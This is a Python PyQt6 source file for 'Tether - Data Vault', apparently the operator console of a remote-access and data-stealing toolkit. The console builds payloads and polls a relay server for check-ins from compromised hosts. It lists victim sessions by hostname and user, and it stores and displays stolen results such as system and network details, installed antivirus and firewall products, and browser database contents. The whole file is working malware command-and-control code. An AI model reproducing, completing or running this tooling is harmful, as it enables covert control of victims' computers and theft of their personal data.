# main.py (Definitive, Professional Formatting)
import sys, time, json
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
                             QPushButton, QLineEdit, QTextEdit, QListWidget, QStackedWidget, QLabel)
from PyQt6.QtCore import QThread, pyqtSignal
from PyQt6.QtGui import QFont

from config import RELAY_URL, C2_USER
from builder import build_payload
from database import DatabaseManager
import requests

class BuildThread(QThread):
    log_message = pyqtSignal(str)
    def __init__(self, name, url, user): super().__init__(); self.name, self.url, self.user = name, url, user
    def run(self): build_payload(self.name, self.url, self.user, self.log_message.emit)

class C2ServerThread(QThread):
    """Renamed for clarity"""
    new_data = pyqtSignal()
    def __init__(self, db_manager):
        super().__init__()
        self.db = db_manager
        self.sessions = self.db.load_all_data()

    def run(self):
        while True:
            try:
                # Fetch new messages from the relay
                response = requests.post(f"{RELAY_URL}/c2/fetch", json={"c2_user": C2_USER}, timeout=15)
                if response.status_code != 200:
                    time.sleep(5)
                    continue

                messages = response.json().get("messages", [])
                if not messages:
                    time.sleep(5)
                    continue
                
                # Process each message
                for msg in messages:
                    payload_data = msg.get("data", {})
                    session_id = payload_data.get("session_id")
                    if not session_id: continue

                    # Check if it's a new session or an update
                    if not self.db.session_exists(session_id):
                        metadata = {"hostname": payload_data.get("hostname"), "user": payload_data.get("user"), "first_seen": time.time()}
                        self.db.create_new_session(session_id, metadata)
                    
                    # Update metadata (always update last_seen)
                    updated_metadata = {"hostname": payload_data.get("hostname"), "user": payload_data.get("user"), "last_seen": time.time()}
                    self.db.update_session_metadata(session_id, updated_metadata)
                    
                    # Process results from the payload
                    for result in payload_data.get("results", []):
                        command, output = result.get("command"), result.get("output")
                        if command and output:
                            self.db.save_vault_data(session_id, command, output)
                
                # Reload all data from DB to refresh local cache and emit signal
                self.sessions = self.db.load_all_data()
                self.new_data.emit()

            except requests.exceptions.RequestException:
                pass # Fail silently on network errors
            time.sleep(5)


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__(); self.setWindowTitle("Tether - Data Vault"); self.setGeometry(100, 100, 900, 700)
        self.db = DatabaseManager()
        self.c2_thread = C2ServerThread(self.db); self.c2_thread.new_data.connect(self.update_session_list); self.c2_thread.start()
        self.stack = QStackedWidget(); self.setCentralWidget(self.stack)
        self.main_screen = QWidget(); self.vault_screen = QWidget()
        self.stack.addWidget(self.main_screen); self.stack.addWidget(self.vault_screen)
        self.setup_main_ui(); self.setup_vault_ui(); self.update_session_list()

    def setup_main_ui(self):
        layout = QVBoxLayout(self.main_screen); builder_box = QHBoxLayout(); layout.addLayout(builder_box)
        self.name_input = QLineEdit(); self.name_input.setPlaceholderText("Enter Payload Name"); builder_box.addWidget(self.name_input)
        self.build_button = QPushButton("Build Payload"); self.build_button.clicked.connect(self.start_build); builder_box.addWidget(self.build_button)
        self.log_box = QTextEdit(); self.log_box.setReadOnly(True); self.log_box.setMaximumHeight(100); layout.addWidget(self.log_box)
        layout.addWidget(QLabel("Sessions:")); self.session_list = QListWidget(); self.session_list.itemClicked.connect(self.show_vault); layout.addWidget(self.session_list)
        
    def setup_vault_ui(self):
        layout = QHBoxLayout(self.vault_screen); left_pane = QVBoxLayout(); layout.addLayout(left_pane, 1)
        self.vault_title = QLabel("Vault for Session:"); left_pane.addWidget(self.vault_title)
        self.module_list = QListWidget(); self.module_list.itemClicked.connect(self.display_module_data); left_pane.addWidget(self.module_list)
        self.clear_button = QPushButton("Clear Module Data"); self.clear_button.clicked.connect(self.clear_data); left_pane.addWidget(self.clear_button)
        back_button = QPushButton("< Back to Sessions"); back_button.clicked.connect(lambda: self.stack.setCurrentWidget(self.main_screen)); left_pane.addWidget(back_button)
        self.data_display = QTextEdit(); self.data_display.setReadOnly(True); self.data_display.setFont(QFont("Courier New", 10)); layout.addWidget(self.data_display, 3)

    def start_build(self):
        name = self.name_input.text()
        if not name: self.log_box.setText("Payload name cannot be empty."); return
        self.build_button.setEnabled(False); self.log_box.clear()
        self.build_thread = BuildThread(name, RELAY_URL, C2_USER); self.build_thread.log_message.connect(self.log_box.append)
        self.build_thread.finished.connect(lambda: self.build_button.setEnabled(True)); self.build_thread.start()

    def update_session_list(self):
        self.session_list.clear()
        sessions = self.c2_thread.sessions
        for session_id, data in sessions.items():
            metadata = data.get('metadata', {}); last_seen = metadata.get('last_seen', 0)
            status = "Online" if time.time() - last_seen < 60 else "Offline"
            hostname = metadata.get('hostname', 'N/A'); user = metadata.get('user', 'N/A')
            self.session_list.addItem(f"{session_id[:8]}... | {status} | {hostname} ({user})")
        
    def show_vault(self, item):
        session_id_prefix = item.text().split(" ")[0][:-3]
        # Find the full session ID
        full_id = next((sid for sid in self.c2_thread.sessions if sid.startswith(session_id_prefix)), None)
        if not full_id: return
        self.current_session_id = full_id

        self.vault_title.setText(f"Vault: {self.current_session_id[:8]}...")
        self.module_list.clear(); self.data_display.clear()
        
        # Load all data for the session from the database for display
        session_data = self.db.conn.execute("SELECT module_name FROM vault WHERE session_id = ?", (self.current_session_id,)).fetchall()
        module_names = sorted([row[0] for row in session_data])
        
        for name in module_names:
            self.module_list.addItem(name)
        self.stack.setCurrentWidget(self.vault_screen)

    def display_module_data(self, item):
        module_name = item.text()
        # Fetch the specific module data from the database
        data_json = self.db.conn.execute("SELECT data FROM vault WHERE session_id = ? AND module_name = ?", (self.current_session_id, module_name)).fetchone()
        if not data_json:
            self.data_display.setText(f"--- {module_name} ---\n\nNo data found in database.")
            return

        raw_data = json.loads(data_json[0])
        pretty_text = self.pretty_print_data(module_name, raw_data)
        self.data_display.setText(pretty_text)
        
    def pretty_print_data(self, module_name, output_packet):
        """IMPROVED: This function now handles all formatting professionally."""
        header = f"--- {module_name} ---\n"
        if not isinstance(output_packet, dict) or "status" not in output_packet: return f"{header}Malformed data packet."
        if output_packet["status"] == "error": return f"{header}\nERROR: {output_packet.get('data', 'Unknown error')}"
        
        data = output_packet.get("data")
        if not data: return f"{header}\nSuccess: No data found."

        text = ""
        # Handle special case for locked browser DBs
        if isinstance(data, list) and any(d.get("error") == "DATABASE_LOCKED" for d in data):
            locked_item = next(d for d in data if d.get("error") == "DATABASE_LOCKED")
            text += f"WARNING: {locked_item['message']}\n\n"
            data = [d for d in data if "error" not in d] # Filter out the error message for table display
            if not data: return header + text + "No other data found."

        if module_name == "System Info":
            for k, v in data.items(): text += f"{k:<15}: {v}\n"
        elif module_name == "Network Info":
            text += f"Public IP: {data.get('Public IP', 'N/A')}\n\n--- Interfaces ---\n"
            for iface, addrs in data.get('Interfaces', {}).items():
                text += f"\n{iface}:\n"
                for addr in addrs: text += f"  - {addr['family']:<8} {addr['address']}\n"
            text += "\n--- Connections ---\n"
            for conn in data.get('Connections', []): text += f"{conn['laddr']:<22} -> {conn['raddr']:<22} {conn['status']}\n"
        elif module_name == "Security Products":
            text += f"Antivirus:\n{data.get('Antivirus')}\n\nFirewall:\n{data.get('Firewall')}"
        elif isinstance(data, list) and data and isinstance(data[0], dict):
            keys = data[0].keys()
            # Calculate column widths intelligently
            widths = {k: max(len(str(k)), min(40, max(len(str(d.get(k, ''))) for d in data))) for k in keys}
            header_line = "  ".join([f"{k.upper():<{widths[k]}}" for k in keys]); separator = "  ".join(['-' * widths[k] for k in keys])
            lines = [header_line, separator]
            for d in data:
                lines.append("  ".join([f"{str(d.get(k, 'N/A'))[:widths[k]]:<{widths[k]}}" for k in keys]))
            text += f"{len(data)} items found.\n\n" + "\n".join(lines)
        else:
            text = json.dumps(data, indent=4)
            
        return header + "\n" + text

    def clear_data(self):
        if not self.module_list.currentItem(): return
        module_name = self.module_list.currentItem().text()
        self.db.clear_module_data(self.current_session_id, module_name)
        self.display_module_data(self.module_list.currentItem()) # Refresh view

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec())